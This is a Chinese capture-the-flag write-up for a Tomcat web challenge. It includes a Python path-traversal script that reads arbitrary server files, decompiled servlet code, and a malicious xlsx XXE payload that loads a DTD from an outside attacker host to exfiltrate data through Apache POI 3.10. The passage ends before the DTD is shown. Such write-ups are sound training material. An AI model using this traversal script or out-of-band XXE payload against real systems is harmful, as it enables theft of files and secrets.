<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">url = <span class="string">"http://b2d90029-53ca-408c-b63e-17a44afcbf73.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remote</span><span class="params">(filename)</span>:</span></span><br><span class="line">    data = &#123;<span class="string">"filename"</span>: <span class="string">"../../../../../../../../.."</span> + filename&#125;</span><br><span class="line">    resp = sess.get(<span class="string">f"<span class="subst">&#123;url&#125;</span>DownloadServlet"</span>, params=data)</span><br><span class="line">    print(resp)</span><br><span class="line">    content = resp.content</span><br><span class="line">    print(content)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'&lt;title&gt;Test&lt;/title&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> content:</span><br><span class="line">        download(filename, content)</span><br><span class="line">    <span class="comment"># return text</span></span><br><span class="line"><span class="comment"># download file</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(filename, text)</span>:</span></span><br><span class="line">    filename = filename[filename.rfind(<span class="string">"/"</span>) + <span class="number">1</span>:]</span><br><span class="line">    print(<span class="string">"[+] write %s"</span> %(filename))</span><br><span class="line">    f = open(filename, <span class="string">"wb"</span>)</span><br><span class="line">    f.write(text)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># local("/readflag")</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        remote(input(<span class="string">'file&gt;'</span>))</span><br></pre></td></tr></table></figure>

<p>查看/proc/self/maps得知tomcat路径</p>
<p>读取<code>../</code>使其报错让burp抓包也可以得到</p>
<p><img src="https://i.loli.net/2020/05/27/TIP2pohaeF7cn43.png" alt="image.png"></p>
<p>然后可以下载<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过以上信息将class全部下载下来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br></pre></td></tr></table></figure>

<p>使用<a href="http://java-decompiler.github.io/" target="_blank" rel="noopener"><code>jd-gui</code></a>反编译</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DownloadServlet.class</span></span><br><span class="line"><span class="keyword">import</span> cn.abc.servlet.DownloadServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    doPost(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String fileName = request.getParameter(<span class="string">"filename"</span>);</span><br><span class="line">    fileName = <span class="keyword">new</span> String(fileName.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>);</span><br><span class="line">    System.out.println(<span class="string">"filename="</span> + fileName);</span><br><span class="line">    <span class="keyword">if</span> (fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">"flag"</span>)) &#123;</span><br><span class="line">      request.setAttribute(<span class="string">"message"</span>, <span class="string">");</span></span><br><span class="line"><span class="string">      request.getRequestDispatcher("</span>/message.jsp<span class="string">").forward((ServletRequest)request, (ServletResponse)response);</span></span><br><span class="line"><span class="string">      return;</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    String fileSaveRootPath = getServletContext().getRealPath("</span>/WEB-INF/upload<span class="string">");</span></span><br><span class="line"><span class="string">    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);</span></span><br><span class="line"><span class="string">    File file = new File(path + "</span>/<span class="string">" + fileName);</span></span><br><span class="line"><span class="string">    if (!file.exists()) &#123;</span></span><br><span class="line"><span class="string">      request.setAttribute("</span>message<span class="string">", "</span>);</span><br><span class="line">      request.getRequestDispatcher(<span class="string">"/message.jsp"</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    String realname = fileName.substring(fileName.indexOf(<span class="string">"_"</span>) + <span class="number">1</span>);</span><br><span class="line">    response.setHeader(<span class="string">"content-disposition"</span>, <span class="string">"attachment;filename="</span> + URLEncoder.encode(realname, <span class="string">"UTF-8"</span>));</span><br><span class="line">    FileInputStream in = <span class="keyword">new</span> FileInputStream(path + <span class="string">"/"</span> + fileName);</span><br><span class="line">    ServletOutputStream out = response.getOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">      out.write(buffer, <span class="number">0</span>, len); </span><br><span class="line">    in.close();</span><br><span class="line">    out.close();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">    <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    String dir = saveRootPath + <span class="string">"/"</span> + dir1 + <span class="string">"/"</span> + dir2;</span><br><span class="line">    File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">    <span class="keyword">if</span> (!file.exists())</span><br><span class="line">      file.mkdirs(); </span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ListFileServlet.class</span></span><br><span class="line"><span class="keyword">import</span> cn.abc.servlet.ListFileServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListFileServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    doPost(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String uploadFilePath = getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">    Map&lt;String, String&gt; fileNameMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    String saveFilename = (String)request.getAttribute(<span class="string">"saveFilename"</span>);</span><br><span class="line">    String filename = (String)request.getAttribute(<span class="string">"filename"</span>);</span><br><span class="line">    System.out.println(<span class="string">"saveFilename"</span> + saveFilename);</span><br><span class="line">    System.out.println(<span class="string">"filename"</span> + filename);</span><br><span class="line">    String realName = saveFilename.substring(saveFilename.indexOf(<span class="string">"_"</span>) + <span class="number">1</span>);</span><br><span class="line">    fileNameMap.put(saveFilename, filename);</span><br><span class="line">    request.setAttribute(<span class="string">"fileNameMap"</span>, fileNameMap);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">"/listfile.jsp"</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UploadServlet.class</span></span><br><span class="line"><span class="keyword">import</span> cn.abc.servlet.UploadServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileUploadException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Sheet;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Workbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    doPost(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String savePath = getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">    String tempPath = getServletContext().getRealPath(<span class="string">"/WEB-INF/temp"</span>);</span><br><span class="line">    File tempFile = <span class="keyword">new</span> File(tempPath);</span><br><span class="line">    <span class="keyword">if</span> (!tempFile.exists())</span><br><span class="line">      tempFile.mkdir(); </span><br><span class="line">    String message = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">      factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">      factory.setRepository(tempFile);</span><br><span class="line">      ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload((FileItemFactory)factory);</span><br><span class="line">      upload.setHeaderEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">      upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">      upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">      <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request))</span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">      List&lt;FileItem&gt; list = upload.parseRequest(request);</span><br><span class="line">      <span class="keyword">for</span> (FileItem fileItem : list) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">          String name = fileItem.getFieldName();</span><br><span class="line">          String str = fileItem.getString(<span class="string">"UTF-8"</span>);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        String filename = fileItem.getName();</span><br><span class="line">        <span class="keyword">if</span> (filename == <span class="keyword">null</span> || filename.trim().equals(<span class="string">""</span>))</span><br><span class="line">          <span class="keyword">continue</span>; </span><br><span class="line">        String fileExtName = filename.substring(filename.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        InputStream in = fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName))</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">            Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">            System.out.println(sheet.getFirstRowNum());</span><br><span class="line">          &#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">          &#125;  </span><br><span class="line">        String saveFilename = makeFileName(filename);</span><br><span class="line">        request.setAttribute(<span class="string">"saveFilename"</span>, saveFilename);</span><br><span class="line">        request.setAttribute(<span class="string">"filename"</span>, filename);</span><br><span class="line">        String realSavePath = makePath(saveFilename, savePath);</span><br><span class="line">        FileOutputStream out = <span class="keyword">new</span> FileOutputStream(realSavePath + <span class="string">"/"</span> + saveFilename);</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">          out.write(buffer, <span class="number">0</span>, len); </span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">        message = <span class="string">";</span></span><br><span class="line"><span class="string">      &#125; </span></span><br><span class="line"><span class="string">    &#125; catch (FileUploadException e) &#123;</span></span><br><span class="line"><span class="string">      e.printStackTrace();</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    request.setAttribute("</span>message<span class="string">", message);</span></span><br><span class="line"><span class="string">    request.getRequestDispatcher("</span>/ListFileServlet<span class="string">").forward((ServletRequest)request, (ServletResponse)response);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private String makeFileName(String filename) &#123;</span></span><br><span class="line"><span class="string">    return UUID.randomUUID().toString() + "</span>_<span class="string">" + filename;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private String makePath(String filename, String savePath) &#123;</span></span><br><span class="line"><span class="string">    int hashCode = filename.hashCode();</span></span><br><span class="line"><span class="string">    int dir1 = hashCode &amp; 0xF;</span></span><br><span class="line"><span class="string">    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;</span></span><br><span class="line"><span class="string">    String dir = savePath + "</span>/<span class="string">" + dir1 + "</span>/<span class="string">" + dir2;</span></span><br><span class="line"><span class="string">    File file = new File(dir);</span></span><br><span class="line"><span class="string">    if (!file.exists())</span></span><br><span class="line"><span class="string">      file.mkdirs(); </span></span><br><span class="line"><span class="string">    return dir;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>DownloadServlet</code>过滤掉了<code>flag</code>关键字，<code>UploadServlet</code>专门检测了xlsx文件，并使用<code>poi-ooxml-3.10</code></p>
<p>确定是Apache POI XML外部实体漏洞即XXE漏洞 <span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjk5Ng==">https://xz.aliyun.com/t/6996<i class="fa fa-external-link-alt"></i></span></p>
<p>新建xlsx文件，命名为<code>excel-crzz.xlsx</code></p>
<p>解压修改<code>[Content_Types].xml</code>，在第二行加入实体</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://frps:6009/file.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>本地Web根目录构造<code>file.dtd</code></p>
